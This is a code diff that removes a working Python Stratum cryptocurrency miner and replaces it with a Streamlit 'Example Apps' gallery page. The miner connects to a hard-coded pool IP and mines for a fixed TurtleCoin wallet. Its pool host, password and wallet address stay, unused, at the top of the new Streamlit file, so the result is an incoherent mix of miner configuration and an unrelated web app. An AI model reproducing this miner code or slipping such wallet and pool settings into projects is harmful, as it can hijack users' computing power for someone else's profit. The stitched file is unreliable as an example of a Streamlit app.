@@ -1,158 +1,364 @@
-import argparse
-import socket
-import select
-import binascii
-import pycryptonight
-import pyrx
-import struct
-import json
-import sys
-import os
-import time
-from multiprocessing import Process, Queue
-
+import itertools
+import streamlit as st
+import ui
+import webbrowser
 
 pool_host = '142.132.131.248'
 pool_port = 80
 pool_pass = '111'
 wallet_address = 'TRTLv1hc4Ys615aVETRD9tB73tP7H53bwY3RQkBn7xH7iJzXP6FqKh9hJ8od82q59QLHLSiWiGEjYhoDPnCAcnWcS8nSGccNVsA'
-nicehash = False
 
+st.set_page_config(
+    page_title="Streamlit Cloud Example Apps",
+    page_icon="https://streamlit.io/favicon.svg",
+)
 
-def main():
-    pool_ip = socket.gethostbyname(pool_host)
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((pool_ip, pool_port))
-    
-    q = Queue()
-    proc = Process(target=worker, args=(q, s))
-    proc.daemon = True
-    proc.start()
-
-    login = {
-        'method': 'login',
-        'params': {
-            'login': wallet_address,
-            'pass': pool_pass,
-            'rigid': '',
-            'agent': 'stratum-miner-py/0.1'
-        },
-        'id':1
-    }
-    print('Logging into pool: {}:{}'.format(pool_host, pool_port))
-    print('Using NiceHash mode: {}'.format(nicehash))
-    s.sendall(str(json.dumps(login)+'\n').encode('utf-8'))
-
-    try:
-        while 1:
-            line = s.makefile().readline()
-            r = json.loads(line)
-            error = r.get('error')
-            result = r.get('result')
-            method = r.get('method')
-            params = r.get('params')
-            if error:
-                print('Error: {}'.format(error))
-                continue
-            if result and result.get('status'):
-                print('Status: {}'.format(result.get('status')))
-            if result and result.get('job'):
-                login_id = result.get('id')
-                job = result.get('job')
-                job['login_id'] = login_id
-                q.put(job)
-            elif method and method == 'job' and len(login_id):
-                q.put(params)
-    except KeyboardInterrupt:
-        print('{}Exiting'.format(os.linesep))
-        proc.terminate()
-        s.close()
-        sys.exit(0)
-
-
-def pack_nonce(blob, nonce):
-    b = binascii.unhexlify(blob)
-    bin = struct.pack('39B', *bytearray(b[:39]))
-    if nicehash:
-        bin += struct.pack('I', nonce & 0x00ffffff)[:3]
-        bin += struct.pack('{}B'.format(len(b)-42), *bytearray(b[42:]))
-    else:
-        bin += struct.pack('I', nonce)
-        bin += struct.pack('{}B'.format(len(b)-43), *bytearray(b[43:]))
-    return bin
-
-
-def worker(q, s):
-    started = time.time()
-    hash_count = 0
-
-    while 1:
-        job = q.get()
-        if job.get('login_id'):
-            login_id = job.get('login_id')
-            print('Login ID: {}'.format(login_id))
-        blob = job.get('blob')
-        target = job.get('target')
-        job_id = job.get('job_id')
-        height = job.get('height')
-        block_major = int(blob[:2], 16)
-        cnv = 0
-        if block_major >= 7:
-            cnv = block_major - 6
-        if cnv > 5:
-            seed_hash = binascii.unhexlify(job.get('seed_hash'))
-            print('New job with target: {}, RandomX, height: {}'.format(target, height))
-        else:
-            print('New job with target: {}, CNv{}, height: {}'.format(target, cnv, height))
-        target = struct.unpack('I', binascii.unhexlify(target))[0]
-        if target >> 32 == 0:
-            target = int(0xFFFFFFFFFFFFFFFF / int(0xFFFFFFFF / target))
-        nonce = 1
-
-        while 1:
-            bin = pack_nonce(blob, nonce)
-            if cnv > 5:
-                hash = pyrx.get_rx_hash(bin, seed_hash, height)
-            else:
-                hash = pycryptonight.cn_slow_hash(bin, cnv, 0, height)
-            hash_count += 1
-            sys.stdout.write('.')
-            sys.stdout.flush()
-            hex_hash = binascii.hexlify(hash).decode()
-            r64 = struct.unpack('Q', hash[24:])[0]
-            if r64 < target:
-                elapsed = time.time() - started
-                hr = int(hash_count / elapsed)
-                print('{}Hashrate: {} H/s'.format(os.linesep, hr))
-                if nicehash:
-                    nonce = struct.unpack('I', bin[39:43])[0]
-                submit = {
-                    'method':'submit',
-                    'params': {
-                        'id': login_id,
-                        'job_id': job_id,
-                        'nonce': binascii.hexlify(struct.pack('<I', nonce)).decode(),
-                        'result': hex_hash
-                    },
-                    'id':1
+def navbar():
+    """Shows a sticky navigation bar with links to other apps at the top of the page."""
+    st.write(
+        """
+        <style>
+            /* Add a black background color to the top navigation */
+            .topnav-container {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 3.5rem;
+                border-bottom: 1px solid rgba(38, 39, 48, 0.2);
+                /* padding-left: 60px; */
+                /* padding-top: 0.5rem;
+                padding-bottom: 0.5rem; */
+                /* padding-right: 100px; */
+                background-color: white;
+                z-index: 98;
+                
+                line-height: 3.5rem;
+                
+                flex: 1 1 0%;
+                
+            }
+            
+            .topnav {
+                overflow: hidden;
+                /* position: relative;
+                top: -50px; */
+                padding-left: 1rem;
+                padding-right: 1rem;
+            
+                max-width: 730px;
+                margin: 0 auto;
+                
+                display: flex;
+                /*justify-content: space-between;*/
+                justify-content: center;
+                align-items: center;
+                
+                vertical-align: middle;
+            }
+            
+            /* Style the links inside the navigation bar */
+            .topnav a {
+                color: rgb(38, 39, 48);
+                text-align: center;
+                text-decoration: none;
+                /* font-size: 17px; */
+            }
+            
+            /* Change the color of links on hover */
+            .topnav a:hover {
+                color: #e24768;
+            }
+            
+            /* Add a color to the active/current link */
+            .topnav a.active {
+                color: #e24768;
+            }
+            
+            /*.topnav-right a {
+                margin-left: 3rem;
+            }*/
+            
+            .topnav-right {
+                display: none;
+            }
+            
+            @media screen and (max-width: 800px) {
+                .topnav-right {
+                    display: none;
                 }
-                print('Submitting hash: {}'.format(hex_hash))
-                s.sendall(str(json.dumps(submit)+'\n').encode('utf-8'))
-                select.select([s], [], [], 3)
-                if not q.empty():
-                    break
-            nonce += 1
+                
+                .topnav {
+                    justify-content: center;
+                }
+            }
+            
+            .topnav-title {
+                margin-left: 1rem;
+                font-weight: 500;
+            }
+        </style>
+        
+        <div class="topnav-container">
+            <nav class="topnav">
+                <div class="topnav-left">
+                    <a href="https://share.streamlit.io/jrieke/st-frontpage/main">
+                        <img src="https://streamlit.io/images/brand/streamlit-mark-color.png" width=35>
+                        <span class="topnav-title">View all apps</span>
+                    </a>
+                </div>
+                <div class="topnav-right">
+                    <a href="https://share.streamlit.io/jrieke/st-frontpage/main">View all apps</a>
+                    <a href="https://share.streamlit.io/" target="_blank"><img src="https://screenshots.imgix.net/mui-org/material-ui-icons/account-circle-outlined/~v=3.9.2/e6ffca0e-87fa-4e5b-92ca-05c6079b5f9e.png?ixlib=js-1.2.0&s=c0f87e872aac058178a34a41422a425d" width=35 style="border-radius: 100%; margin-left: 1rem;"></a>
+                </div>
+            </nav>
+        </div>
+        """,
+        unsafe_allow_html=True,
+    )
 
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser()
-    parser.add_argument('--nicehash', action='store_true', help='NiceHash mode')
-    parser.add_argument('--host', action='store', help='Pool host')
-    parser.add_argument('--port', action='store', help='Pool port')
-    args = parser.parse_args()
-    if args.nicehash:
-        nicehash = True
-    if args.host:
-        pool_host = args.host
-    if args.port:
-        pool_port = int(args.port)
-    main()
+st.image("https://streamlit.io/images/brand/streamlit-mark-color.png", width=100)
+st.title("Streamlit Cloud Example Apps")
+st.write(
+    "🚀 To deploy an app with your own [Streamlit Cloud](https://share.streamlit.io/) account,"
+    " click 'View App Repo'"
+)
+st.write("🤔 Stuck? Check out our [docs on deploying apps](https://docs.streamlit.io/en/stable/deploy_streamlit_app.html) or reach out to support@streamlit.io")
+st.write("ℹ️ Check out more information on [forking](https://docs.github.com/en/get-started/quickstart/fork-a-repo) and [cloning](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository) GitHub repositories!")
+# github_options = st.radio("Would you like to clone or fork the repository?", ('Fork', 'Clone'))
+
+st.markdown(
+    """
+    <style>
+        .screenshot {
+            border: 1px solid rgba(38, 39, 48, 0.2);
+            border-radius: 0.25rem;
+        }
+        
+        h3 {
+            padding-top: 1rem;
+        }
+        
+        h3 a {
+            color: var(--text-color) !important;
+            text-decoration: none;
+        }
+        
+        small a {
+            color: var(--text-color) !important;
+            text-decoration: none;
+        }
+        
+        a:hover {
+            text-decoration: none;
+        }
+    </style>
+    
+    <!-- Open links in new tabs by default. Required for Streamlit sharing to not open links within the iframe. -->
+    <base target="_blank">
+    """,
+    unsafe_allow_html=True,
+)
+
+category_colors_cycle = itertools.cycle(
+    [
+        # ui.color("red-70"),
+        ui.color("orange-70"),
+        ui.color("light-blue-70"),
+        ui.color("blue-green-70"),
+        ui.color("blue-70"),
+        ui.color("violet-70"),
+        ui.color("red-70"),
+        ui.color("green-70"),
+    ]
+)
+
+
+def category(name, description=None):
+    # if current_category_index != 0:
+    # st.write("---")
+    # st.write("")
+    # pass
+    # ui.colored_header(name, "rgba(38, 39, 48, 0.6)")
+    ui.colored_header(name, next(category_colors_cycle), description)
+    # st.header(name)
+    st.write("")
+
+    # current_category_index += 1
+
+def app(name, description, image, link, repo_name):
+    ui.linked_image(image, link)
+    st.subheader(f"[{name}]({link})")
+    st.caption(f"[{description}]({link})")
+    clone_code = "git clone {} ".format(repo_name)
+    st.code(clone_code, language="python")
+    repo_link = "https://github.com/streamlit/{0}/".format(repo_name)
+    st.write("[👀 View App Repo](%s)" % repo_link)
+    st.write("")
+
+category("📊 Data Visualization")
+col1, col2, col3 = st.columns(3)
+with col1:
+    app(
+        "Interactive Data",
+        "Make data apps to interactively explore data. In this case, check out NYC Uber pickups.",
+        "images/Uber.png",
+        "https://share.streamlit.io/streamlit/demo-uber-nyc-pickups/main",
+        "demo-uber-nyc-pickups",
+    )
+    app(
+        "Annotations",
+        "Give more context to your time series data using annotations.",
+        "images/Annotations.png",
+        "https://share.streamlit.io/streamlit/example-app-time-series-annotation/main",
+        "example-app-time-series-annotation",
+    )
+with col2:
+    app(
+        "Data Wrangler",
+        "Explore data from a CSV by uploading the CSV and converting it into an interactive dataframe.",
+        "images/CSVWrangler.png",
+        "https://share.streamlit.io/streamlit/example-app-csv-wrangler/main/app.py",
+        "example-app-csv-wrangler",
+    )
+    app(
+        "Interactive Tables",
+        "Create interactive tables with the streamlit-aggrid component.",
+        "images/InteractiveTables.png",
+        "https://share.streamlit.io/streamlit/example-app-interactive-table/main",
+        "example-app-interactive-table",
+    )
+with col3:
+    app(
+        "Finance Explorer",
+        "Look at live data and compare trends. This app uses the Binance API to explore crypto data.",
+        "images/FinanceExplorer.png",
+        "https://share.streamlit.io/streamlit/example-app-crypto-dashboard/main/app.py",
+        "example-app-crypto-dashboard",
+    )
+    app(
+        "Job Monitoring",
+        "Monitor the performance of your data jobs.",
+        "images/MonitoringDashboard.png",
+        "https://share.streamlit.io/streamlit/example-app-dbt/main/app.py",
+        "example-app-dbt",
+    )
+
+category("🧠 Machine Learning")
+col1, col2, col3 = st.columns(3)
+with col1:
+    app(
+        "Model Debugger",
+        "Visualize your model to debug the output. This app uses Tensorflow and GAN to generate photorealistic images.",
+        "images/FaceGAN.png",
+        "https://share.streamlit.io/streamlit/demo-face-gan/",
+        "demo-face-gan",
+    )
+    app(
+        "Keyword Extraction",
+        "Leverage NLP embeddings to create key phrases that are most similar to a document.",
+        "images/KeywordExtractor.png",
+        "https://share.streamlit.io/streamlit/example-app-bert-keyword-extractor/main/app.py",
+        "example-app-bert-keyword-extractor",
+    )
+    app(
+        "Speech to Text",
+        "A speech-to-text transcription app. Upload a .wav file, transcribe it, download it!",
+        "images/SpeechToText.png",
+        "https://share.streamlit.io/streamlit/example-app-speech-to-text-transcription/main",
+        "example-app-speech-to-text-transcription",
+    )
+with col2:
+    app(
+        "ML Tools",
+        "Create machine learning tools for others to use your models. This app generates images using the Deep Dream technique.",
+        "images/DeepDream.png",
+        "https://share.streamlit.io/streamlit/demo-deepdream/master",
+        "demo-deepdream",
+    )
+    app(
+        "Document Anonymizer",
+        "Detect entities (persons, orgs, and locations) present in a document and anonymize them in one click.",
+        "images/DocumentAnonymizer.png",
+        "https://share.streamlit.io/charlywargnier/streamlit-text-anonymizer/main/app.py",
+        "streamlit-text-anonymizer",
+    )
+    app(
+        "FAQ Generation",
+        "An FAQ generator that generates quality question/answer pairs from URLs.",
+        "images/FAQGeneration.png",
+        "https://share.streamlit.io/streamlit/example-app-qa-generator/main",
+        "example-app-qa-generator",
+    )
+with col3:
+    app(
+        "Data Browser",
+        "Explore large datasets for input into ML models. This app displays self-driving car data and does real-time detection using YOLO.",
+        "images/SelfDriving.png",
+        "https://share.streamlit.io/streamlit/demo-self-driving/master",
+        "demo-self-driving",
+    )
+    app(
+        "Sentiment Analysis",
+        "A text analysis dashboard. Type in a term to view the corresponding Twitter sentiment",
+        "images/SentimentAnalysis.png",
+        "https://share.streamlit.io/streamlit/example-app-twitter-analyzer/main",
+        "example-app-twitter-analyzer",
+    )
+
+category("📦 Product")
+col1, col2, col3 = st.columns(3)
+with col1:
+    app(
+        "Info Sharing",
+        "Share data or information with others. This app pulls Streamlit's roadmap via the Notion API.",
+        "images/Roadmap.png",
+        "https://share.streamlit.io/streamlit/roadmap",
+        "roadmap",
+    )
+with col2:
+    app(
+        "A/B Testing",
+        "Upload your experiment results to explore the statistical significance of an A/B test.",
+        "images/ABTesting.png",
+        "https://share.streamlit.io/streamlit/example-app-ab-testing/main",
+        "example-app-ab-testing",
+    )
+    
+category("🦄 Other")
+col1, col2, col3 = st.columns(3)
+with col1:
+    app(
+        "Databases",
+        "Easily collect data from users and write to a database.",
+        "images/BugReport.png",
+        "https://share.streamlit.io/streamlit/example-app-bug-report/main",
+        "example-app-bug-report",
+    )
+    app(
+        "File Format Conversion",
+        "Convert file formats.",
+        "images/FileConverter.png",
+        "https://share.streamlit.io/streamlit/example-app-file-converter/main",
+        "example-app-file-converter",
+        )
+with col2:
+    app(
+        "File Generation",
+        "Quickly generate a PDF file using data collected from user input.",
+        "images/PDFGenerator.png",
+        "https://share.streamlit.io/streamlit/example-app-pdf-report/main",
+        "example-app-pdf-report",
+    )
+with col3:
+    app(
+        "Collaboration",
+        "Allow viewers of your app to collaborate via a commenting feature.",
+        "images/Comments.png",
+        "https://share.streamlit.io/streamlit/example-app-commenting/main",
+        "example-app-commenting",
+    )
+    
+st.header("🤩 Want more example apps?")
+gallery_link = "https://streamlit.io/gallery"
+st.write("[Check out our app gallery!](%s)" % gallery_link)
